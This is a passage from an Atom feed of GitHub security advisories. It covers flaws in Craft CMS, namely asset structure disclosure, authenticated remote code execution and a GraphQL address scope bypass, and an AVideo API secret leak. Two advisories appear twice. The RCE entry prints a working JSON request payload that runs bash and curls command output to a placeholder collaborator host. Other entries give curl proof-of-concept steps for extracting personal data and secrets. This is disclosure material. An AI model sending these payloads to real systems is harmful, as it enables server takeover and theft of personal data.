<li>Fetches any asset by ID with <code>Asset::findOne($assetId)</code> — no <code>editable</code>/<code>savable</code> scope filter, so all assets across all volumes are reachable.</li>
<li>Returns sensitive structural data via JSON.</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li>Any authenticated control panel user with only <code>accessCp</code> permission can discover the filenames and complete folder structure (names, UIDs, handles, URIs) of assets in volumes they are not authorized to access.</li>
<li>Sensitive volume structures — private document repositories, confidential media, internal file names — are exposed to any user who can log into the control panel.</li>
<li>This enables targeted follow-up attacks: an attacker who knows a private asset’s filename and folder path may have other avenues to exfiltrate the actual file.</li>
</ul>
<h2 id="resources">Resources</h2>
<p><a href="https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586">https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-33m5-hqp9-97pw">https://github.com/craftcms/cms/security/advisories/GHSA-33m5-hqp9-97pw</a></li>
<li><a href="https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586">https://github.com/craftcms/cms/commit/e3f3eaab3d85badd713cfc2c24e5f0792ecdb586</a></li>
<li><a href="https://github.com/advisories/GHSA-33m5-hqp9-97pw">https://github.com/advisories/GHSA-33m5-hqp9-97pw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33m5-hqp9-97pw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:54:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS has Potential Authenticated Remote Code Execution via Malicious Attached Behavior]]></title>
        <id>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</id>
        <link href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw"/>
        <updated>2026-05-06T17:54:06.000Z</updated>
        <content type="html"><![CDATA[<p>We identified a vulnerability in the latest version of Craft CMS which contains an input-handling flaw in a Yii object creation path that let any authenticated user inject malicious configuration and execute arbitrary commands on the server.  Yii’s dynamic object configuration, as implemented in Craft CMS, is a feature that lets the application build parts of itself from a settings list.</p>
<p>This is largely a continuation of <a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a>, but through a different path that was not mitigated in the original.</p>
<p>The request-controlled condition field layouts data is converted into a live FieldLayout object without a <code>Component::cleanseConfig()</code> boundary. Because Craft configures models before <code>parent::__construct()</code>, attacker-controlled special config keys can take effect during object creation, and FieldLayout initialization then triggers a same-request event.</p>
<p>This appears to be another variant of the recent object-config / behavior-injection bug family, but via the condition / field layout hydration path.</p>
<p>We were able to reproduce the attack by issuing a POST request to <code>/admin/actions/element-search/search</code> with the following JSON from any connected user. Other routes can be exploited in the same way, including the rest of the element-indexes actions that pass through that same <code>beforeAction()</code> path. This results in a curl request to the chosen server with the result of the command “id” for the web user being appended to the path:</p>
<pre><code>POST /admin/actions/element-search/search HTTP/2
Host: hostnamehere
Cookie: CraftSessionId=...; 1234123412341234_identity=...; CRAFT_CSRF_TOKEN=...;
Content-Length: …
User-Agent: Mozilla/5.0
X-Csrf-Token: ...
Accept: application/json
Content-Type: application/json

{

 "elementType": "craft\\elements\\Category",
 "siteId": 1,
 "search": "",
 "condition": {
   "class": "craft\\elements\\conditions\\ElementCondition",
   "elementType": "craft\\elements\\Category",
   "fieldLayouts": [
     {
       "as rce": {
         "__class": "yii\\behaviors\\AttributeTypecastBehavior",
         "__construct()": [
           {
             "attributeTypes": {
               "typecastBeforeSave": [
                 "Psy\\Readline\\Hoa\\ConsoleProcessus",
                 "execute"
               ]
             },
             "typecastBeforeSave": "/bin/bash -c \"curl [https://yourcollaboratorservergoeshere/`id`\](https://yourcollaboratorservergoeshere/%60id%60/)""
           }
         ]
       },
       "on *": "self::beforeSave"
     }
   ]
 }
}
</code></pre>
<h2 id="resources">Resources</h2>
<p><a href="https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3">https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a></li>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
<li><a href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:54:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS has Potential Authenticated Remote Code Execution via Malicious Attached Behavior]]></title>
        <id>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</id>
        <link href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw"/>
        <updated>2026-05-06T17:54:06.000Z</updated>
        <content type="html"><![CDATA[<p>We identified a vulnerability in the latest version of Craft CMS which contains an input-handling flaw in a Yii object creation path that let any authenticated user inject malicious configuration and execute arbitrary commands on the server.  Yii’s dynamic object configuration, as implemented in Craft CMS, is a feature that lets the application build parts of itself from a settings list.</p>
<p>This is largely a continuation of <a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a>, but through a different path that was not mitigated in the original.</p>
<p>The request-controlled condition field layouts data is converted into a live FieldLayout object without a <code>Component::cleanseConfig()</code> boundary. Because Craft configures models before <code>parent::__construct()</code>, attacker-controlled special config keys can take effect during object creation, and FieldLayout initialization then triggers a same-request event.</p>
<p>This appears to be another variant of the recent object-config / behavior-injection bug family, but via the condition / field layout hydration path.</p>
<p>We were able to reproduce the attack by issuing a POST request to <code>/admin/actions/element-search/search</code> with the following JSON from any connected user. Other routes can be exploited in the same way, including the rest of the element-indexes actions that pass through that same <code>beforeAction()</code> path. This results in a curl request to the chosen server with the result of the command “id” for the web user being appended to the path:</p>
<pre><code>POST /admin/actions/element-search/search HTTP/2
Host: hostnamehere
Cookie: CraftSessionId=...; 1234123412341234_identity=...; CRAFT_CSRF_TOKEN=...;
Content-Length: …
User-Agent: Mozilla/5.0
X-Csrf-Token: ...
Accept: application/json
Content-Type: application/json

{

 "elementType": "craft\\elements\\Category",
 "siteId": 1,
 "search": "",
 "condition": {
   "class": "craft\\elements\\conditions\\ElementCondition",
   "elementType": "craft\\elements\\Category",
   "fieldLayouts": [
     {
       "as rce": {
         "__class": "yii\\behaviors\\AttributeTypecastBehavior",
         "__construct()": [
           {
             "attributeTypes": {
               "typecastBeforeSave": [
                 "Psy\\Readline\\Hoa\\ConsoleProcessus",
                 "execute"
               ]
             },
             "typecastBeforeSave": "/bin/bash -c \"curl [https://yourcollaboratorservergoeshere/`id`\](https://yourcollaboratorservergoeshere/%60id%60/)""
           }
         ]
       },
       "on *": "self::beforeSave"
     }
   ]
 }
}
</code></pre>
<h2 id="resources">Resources</h2>
<p><a href="https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3">https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a></li>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
<li><a href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:54:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS's Missing Authorization in GraphQL Address Resolver Allows Cross-Scope PII Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</id>
        <link href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw"/>
        <updated>2026-05-06T17:49:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The GraphQL Address element resolver (src/gql/resolvers/elements/Address.php) performs no schema scope filtering on top-level queries. A GraphQL API token scoped to a single low-privilege user group can read every address in the system, including addresses belonging to users in groups the token has no authorization to access. This exposes PII, including full names, addresses, organizations, tax IDs, etc.</p>
<h3 id="details">Details</h3>
<p>Every GraphQL element resolver in Craft CMS applies schema scope filtering via <code>GqlHelper::extractAllowedEntitiesFromSchema()</code> when handling top-level queries, except the Address resolver.</p>
<p>The only gate check for addresses is <code>canQueryUsers()</code> (<code>src/gql/queries/Address.php</code>, line 30), which is a binary check. It returns <code>true</code> if the token has access to <em>any</em> user group. Once past this gate, no further filtering is applied.</p>
<h3 id="poc">PoC</h3>
<p><strong>Tested on:</strong> CraftCMS 5.9.17 (fresh Docker install, PHP 8.3)
<strong>Prerequisites:</strong> A GraphQL API token with read access to any single user group</p>
<h3 id="environment">Environment</h3>
<ul>
<li>Two user groups: <code>publicUsers</code> (in token scope) and <code>internalTeam</code> (NOT in scope)</li>
<li>5 internal executives with corporate addresses (internalTeam)</li>
<li>3 public customers with personal addresses (publicUsers)</li>
<li>GQL token scoped to <code>publicUsers:read</code> only</li>
</ul>
<p><strong>Step 1:</strong> Introspect the schema to discover the <code>addresses</code> query is available to this token. Issue the below curl command </p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"Query\") { fields { name description } } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/d798b4d2-9965-40fd-8252-ba6b08d1dde9" alt="image" height="856" width="1641">

<p>The token can see <code>addresses</code>, <code>entries</code>, <code>users</code> as top-level queries.</p>
<p><strong>Step 2:</strong> Enumerate Address fields to identify PII exposure surface.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"AddressInterface\") { fields { name
type { name } } } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/31a90b5d-7337-49b9-8802-355f16b7b4f3" alt="image" height="862" width="1726">

<blockquote>
<p>Exposed fields include: <code>fullName</code>, <code>firstName</code>, <code>lastName</code>, <code>addressLine1/2/3</code>, <code>locality</code>, <code>postalCode</code>, <code>countryCode</code>, <code>organization</code>, <code>organizationTaxId</code>, <code>latitude</code>, <code>longitude</code>.</p>
</blockquote>
<p><strong>Step 3:</strong> Establish baseline -  confirm the token’s user scope is limited. This proves our token only has access to the <code>publicUsers</code> group.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/42ec8c3d-d1ae-4eac-9202-af072f394e4a" alt="image" height="492" width="1626">

<p>Only 5 public users returned. Scope enforcement works correctly for the User resolver — internal executives are NOT visible.</p>
<p><strong>Step 4:</strong> Query all addresses - the token returns data for ALL user groups, including those outside its authorized scope.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/ef34e11c-36a8-4582-93e3-04c3e4dad6ab" alt="image" height="910" width="1902">

<img src="https://github.com/user-attachments/assets/64d6edec-60bf-4481-8a20-7f64c81c015b" alt="image" height="942" width="1444">


<p> ▎ "This token can only see 5 users, but it returns 10 addresses" as shown in the above 2 screenshot outputs</p>
<blockquote>
<p><strong>All 10 addresses returned.</strong> The same token that only sees 5 public users now returns addresses for internal executives including corporate tax IDs:</p>
<ul>
<li>Sarah Chen, 4200 Executive Plaza Dr, SF — Horizon Dynamics Inc. (TaxID: 82-4917263)</li>
<li>James Whitfield, 89 Kensington High St, London — Whitfield Capital Partners LLP (TaxID: GB927461038)</li>
<li>Maria Rossi, 15 Via della Conciliazione, Roma — Rossi &amp; Bianchi Avvocati (TaxID: IT04829173651)</li>
<li>David Nakamura, 2-11-3 Meguro, Tokyo — Nakamura Medical Technologies KK (TaxID: JP8230-4719-2835)</li>
<li>Elena Voronova, 27 Universitätsstrasse, Zurich — Voronova Biotech AG (TaxID: CHE-384.291.057)</li>
</ul>
</blockquote>
<hr>
<p><strong>Step 5:</strong> Targeted IDOR - extract a specific internal user’s address by owner ID.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses(ownerId: [3]) { fullName addressLine1 addressLine2 locality postalCode countryCode organization
  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/b7c6d5cf-295a-433a-a76c-2b69815968cd" alt="image" height="365" width="1902">

<blockquote>
<p>Directly extracts a specific internal team member’s address: “Secret Admin”, 1 Secret Government Facility, Suite 007, Langley 22101 — SecretCorp LLC (TaxID: 98-7654321). The token has zero authorization to access this user’s data.</p>
</blockquote>
<h2 id="impact">Impact</h2>
<h3 id="who-is-impacted">Who is Impacted</h3>
<p>Any Craft CMS Pro site (v4.0.0+) that uses GraphQL API tokens with user group scoping and stores user addresses. This is the standard deployment pattern for headless CMS sites using frameworks such as Next.js, Nuxt.js, or Gatsby. An attacker with any valid GraphQL token that has access to at least one user group can extract all addresses in the system, regardless of scope restrictions.</p>
<h3 id="risk">Risk</h3>
<ul>
<li><p>Direct threat to installation data: Any GraphQL API token with access to any single user group can extract all address systems-wide, including names, home addresses, organizations, and tax IDs belonging to users in restricted groups.</p>
</li>
<li><p>Targeted extraction via IDOR: The <code>ownerId</code> argument allows an attacker to extract specific users’ addresses by ID, enabling targeted reconnaissance against administrators or high-value users without any brute-force or elevated access.</p>
</li>
<li><p>Scope boundary failure: Craft CMS’s GraphQL schema scoping system is the primary security mechanism for controlling API access. Every other element resolver (Entry, User, Asset, Category, Tag) enforces this boundary. The Address resolver does not, making this a foundational gap in Craft’s native authorization model and not a site-specific configuration issue.</p>
</li>
<li><p>Affects all installations using GraphQL with user groups: Any Craft CMS Pro site that exposes a scoped GraphQL token and stores addresses is affected. This is the standard headless CMS deployment pattern, not an edge case.</p>
</li>
</ul>
<h2 id="ai-disclosure">AI Disclosure</h2>
<p>This vulnerability was identified through manual source code review with AI-assisted analysis (Claude). The initial pattern deviation (Address resolver missing scope filtering while all other resolvers have it) was identified through manual comparison of resolver implementations. AI was used to assist with code navigation, PoC scripting, and report drafting. </p>
<p>All findings were verified against a local Docker instance of Craft CMS 5.9.17.</p>
<h2 id="resources">Resources</h2>
<p><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
<li><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></li>
<li><a href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:49:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS's Missing Authorization in GraphQL Address Resolver Allows Cross-Scope PII Disclosure]]></title>
        <id>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</id>
        <link href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw"/>
        <updated>2026-05-06T17:49:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The GraphQL Address element resolver (src/gql/resolvers/elements/Address.php) performs no schema scope filtering on top-level queries. A GraphQL API token scoped to a single low-privilege user group can read every address in the system, including addresses belonging to users in groups the token has no authorization to access. This exposes PII, including full names, addresses, organizations, tax IDs, etc.</p>
<h3 id="details">Details</h3>
<p>Every GraphQL element resolver in Craft CMS applies schema scope filtering via <code>GqlHelper::extractAllowedEntitiesFromSchema()</code> when handling top-level queries, except the Address resolver.</p>
<p>The only gate check for addresses is <code>canQueryUsers()</code> (<code>src/gql/queries/Address.php</code>, line 30), which is a binary check. It returns <code>true</code> if the token has access to <em>any</em> user group. Once past this gate, no further filtering is applied.</p>
<h3 id="poc">PoC</h3>
<p><strong>Tested on:</strong> CraftCMS 5.9.17 (fresh Docker install, PHP 8.3)
<strong>Prerequisites:</strong> A GraphQL API token with read access to any single user group</p>
<h3 id="environment">Environment</h3>
<ul>
<li>Two user groups: <code>publicUsers</code> (in token scope) and <code>internalTeam</code> (NOT in scope)</li>
<li>5 internal executives with corporate addresses (internalTeam)</li>
<li>3 public customers with personal addresses (publicUsers)</li>
<li>GQL token scoped to <code>publicUsers:read</code> only</li>
</ul>
<p><strong>Step 1:</strong> Introspect the schema to discover the <code>addresses</code> query is available to this token. Issue the below curl command </p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"Query\") { fields { name description } } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/d798b4d2-9965-40fd-8252-ba6b08d1dde9" alt="image" height="856" width="1641">

<p>The token can see <code>addresses</code>, <code>entries</code>, <code>users</code> as top-level queries.</p>
<p><strong>Step 2:</strong> Enumerate Address fields to identify PII exposure surface.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"AddressInterface\") { fields { name
type { name } } } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/31a90b5d-7337-49b9-8802-355f16b7b4f3" alt="image" height="862" width="1726">

<blockquote>
<p>Exposed fields include: <code>fullName</code>, <code>firstName</code>, <code>lastName</code>, <code>addressLine1/2/3</code>, <code>locality</code>, <code>postalCode</code>, <code>countryCode</code>, <code>organization</code>, <code>organizationTaxId</code>, <code>latitude</code>, <code>longitude</code>.</p>
</blockquote>
<p><strong>Step 3:</strong> Establish baseline -  confirm the token’s user scope is limited. This proves our token only has access to the <code>publicUsers</code> group.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/42ec8c3d-d1ae-4eac-9202-af072f394e4a" alt="image" height="492" width="1626">

<p>Only 5 public users returned. Scope enforcement works correctly for the User resolver — internal executives are NOT visible.</p>
<p><strong>Step 4:</strong> Query all addresses - the token returns data for ALL user groups, including those outside its authorized scope.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/ef34e11c-36a8-4582-93e3-04c3e4dad6ab" alt="image" height="910" width="1902">

<img src="https://github.com/user-attachments/assets/64d6edec-60bf-4481-8a20-7f64c81c015b" alt="image" height="942" width="1444">


<p> ▎ "This token can only see 5 users, but it returns 10 addresses" as shown in the above 2 screenshot outputs</p>
<blockquote>
<p><strong>All 10 addresses returned.</strong> The same token that only sees 5 public users now returns addresses for internal executives including corporate tax IDs:</p>
<ul>
<li>Sarah Chen, 4200 Executive Plaza Dr, SF — Horizon Dynamics Inc. (TaxID: 82-4917263)</li>
<li>James Whitfield, 89 Kensington High St, London — Whitfield Capital Partners LLP (TaxID: GB927461038)</li>
<li>Maria Rossi, 15 Via della Conciliazione, Roma — Rossi &amp; Bianchi Avvocati (TaxID: IT04829173651)</li>
<li>David Nakamura, 2-11-3 Meguro, Tokyo — Nakamura Medical Technologies KK (TaxID: JP8230-4719-2835)</li>
<li>Elena Voronova, 27 Universitätsstrasse, Zurich — Voronova Biotech AG (TaxID: CHE-384.291.057)</li>
</ul>
</blockquote>
<hr>
<p><strong>Step 5:</strong> Targeted IDOR - extract a specific internal user’s address by owner ID.</p>
<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses(ownerId: [3]) { fullName addressLine1 addressLine2 locality postalCode countryCode organization
  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
</code></pre>
<img src="https://github.com/user-attachments/assets/b7c6d5cf-295a-433a-a76c-2b69815968cd" alt="image" height="365" width="1902">

<blockquote>
<p>Directly extracts a specific internal team member’s address: “Secret Admin”, 1 Secret Government Facility, Suite 007, Langley 22101 — SecretCorp LLC (TaxID: 98-7654321). The token has zero authorization to access this user’s data.</p>
</blockquote>
<h2 id="impact">Impact</h2>
<h3 id="who-is-impacted">Who is Impacted</h3>
<p>Any Craft CMS Pro site (v4.0.0+) that uses GraphQL API tokens with user group scoping and stores user addresses. This is the standard deployment pattern for headless CMS sites using frameworks such as Next.js, Nuxt.js, or Gatsby. An attacker with any valid GraphQL token that has access to at least one user group can extract all addresses in the system, regardless of scope restrictions.</p>
<h3 id="risk">Risk</h3>
<ul>
<li><p>Direct threat to installation data: Any GraphQL API token with access to any single user group can extract all address systems-wide, including names, home addresses, organizations, and tax IDs belonging to users in restricted groups.</p>
</li>
<li><p>Targeted extraction via IDOR: The <code>ownerId</code> argument allows an attacker to extract specific users’ addresses by ID, enabling targeted reconnaissance against administrators or high-value users without any brute-force or elevated access.</p>
</li>
<li><p>Scope boundary failure: Craft CMS’s GraphQL schema scoping system is the primary security mechanism for controlling API access. Every other element resolver (Entry, User, Asset, Category, Tag) enforces this boundary. The Address resolver does not, making this a foundational gap in Craft’s native authorization model and not a site-specific configuration issue.</p>
</li>
<li><p>Affects all installations using GraphQL with user groups: Any Craft CMS Pro site that exposes a scoped GraphQL token and stores addresses is affected. This is the standard headless CMS deployment pattern, not an edge case.</p>
</li>
</ul>
<h2 id="ai-disclosure">AI Disclosure</h2>
<p>This vulnerability was identified through manual source code review with AI-assisted analysis (Claude). The initial pattern deviation (Address resolver missing scope filtering while all other resolvers have it) was identified through manual comparison of resolver implementations. AI was used to assist with code navigation, PoC scripting, and report drafting. </p>
<p>All findings were verified against a local Docker instance of Craft CMS 5.9.17.</p>
<h2 id="resources">Resources</h2>
<p><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
<li><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></li>
<li><a href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-06T17:49:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[wwbn/avideo] AVideo Vulnerable to Exposure of Sensitive Information to an Unauthorized Actor and Missing Authorization]]></title>
        <id>https://github.com/advisories/GHSA-xr49-f4rh-qcjf</id>
        <link href="https://github.com/advisories/GHSA-xr49-f4rh-qcjf"/>
        <updated>2026-05-05T22:20:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>  An unauthenticated user can read <code>APISecret</code> from <code>objects/plugins.json.php</code> and use it to call protected API endpoints
  (e.g. <code>users_list</code>) without logging in.</p>
<h3 id="details">Details</h3>
<p>  <code>objects/plugins.json.php</code> is public and still exposes plugin <code>object_data</code> containing <code>APISecret</code>.
  That secret is accepted by <code>plugin/API/get.json.php</code> as authentication.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Get plugin config (contains <code>APISecret</code>):</li>
</ol>
<pre><code class="language-bash">curl 'http://&lt;host&gt;/objects/plugins.json.php'
</code></pre>
<img src="https://github.com/user-attachments/assets/027073fc-dccd-4e1d-8450-ad12345e88eb" alt="image" height="94" width="879">

<ol start="2">
<li>Copy APISecret from response, then call API directly:</li>
</ol>
<pre><code class="language-bash">curl --get 'http://&lt;host&gt;/plugin/API/get.json.php' \
  --data-urlencode 'APIName=users_list' \
  --data-urlencode 'APISecret=&lt;APISecret&gt;' \
  --data-urlencode 'rowCount=3' \
  --data-urlencode 'current=1'
</code></pre>
<img src="https://github.com/user-attachments/assets/edd629be-e75c-40a2-a52f-2f2e6da99b79" alt="image" height="170" width="1719">


<h3 id="impact">Impact</h3>
<p>  Unauthenticated disclosure of sensitive config (APISecret) leading to unauthorized access to protected API data.</p>
<h3 id="recommended-fix">Recommended fix</h3>
<p>  Requiring admin auth for full plugin inventory/config endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-xr49-f4rh-qcjf">https://github.com/WWBN/AVideo/security/advisories/GHSA-xr49-f4rh-qcjf</a></li>
<li><a href="https://github.com/WWBN/AVideo/commit/1c36f229d0a103528fb9f64d0a1cc0e1e8f5999b">https://github.com/WWBN/AVideo/commit/1c36f229d0a103528fb9f64d0a1cc0e1e8f5999b</a></li>
<li><a href="https://github.com/advisories/GHSA-xr49-f4rh-qcjf">https://github.com/advisories/GHSA-xr49-f4rh-qcjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xr49-f4rh-qcjf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T22:20:42.000Z</published>
    </entry>
</feed>